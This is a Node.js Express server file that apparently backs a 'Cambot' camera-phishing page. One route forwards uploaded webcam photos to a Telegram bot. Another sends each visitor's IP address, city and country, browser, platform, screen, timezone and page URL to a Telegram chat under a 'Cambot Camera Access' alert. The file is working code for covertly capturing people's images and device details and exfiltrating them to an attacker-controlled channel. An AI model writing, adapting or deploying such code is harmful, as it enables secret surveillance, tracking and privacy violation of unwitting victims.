import express from "express";
import multer from "multer";
import FormData from "form-data";
import fetch from "node-fetch";
import geoip from "geoip-lite";

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const geo = geoip.lookup(ip);
  req.clientGeo = geo;
  req.clientIp = ip;
  next();
});

app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", req.file.buffer, {
      filename: "photo.jpg",
      contentType: "image/jpeg",
    });

    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: form }
    );
    const data = await tgRes.json();

    res.json(data);
  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ error: "Upload failed" });
  }
});

app.post("/user-access", express.json(), async (req, res) => {
  try {
    const { userAgent, language, platform, screen, timezone, url } = req.body;
    const ip = req.clientIp;
    const geo = req.clientGeo;
    
    const message = `
🚨 Cambot Camera Access

👤 User Info:
• IP: ${ip}
• Location: ${geo ? `${geo.city}, ${geo.country}` : 'Unknown'}
• Browser: ${userAgent}
• Language: ${language}
• Platform: ${platform}
• Screen: ${screen}
• Timezone: ${timezone}
• URL: ${url}
• Accessed: ${new Date().toISOString()}
    `;

    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      }
    );
    
    const data = await tgRes.json();
    res.json({ status: "success" });
  } catch (err) {
    console.error("Error sending user info:", err);
    res.status(500).json({ error: "Failed to send user info" });
  }
});

app.use(express.static("public"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
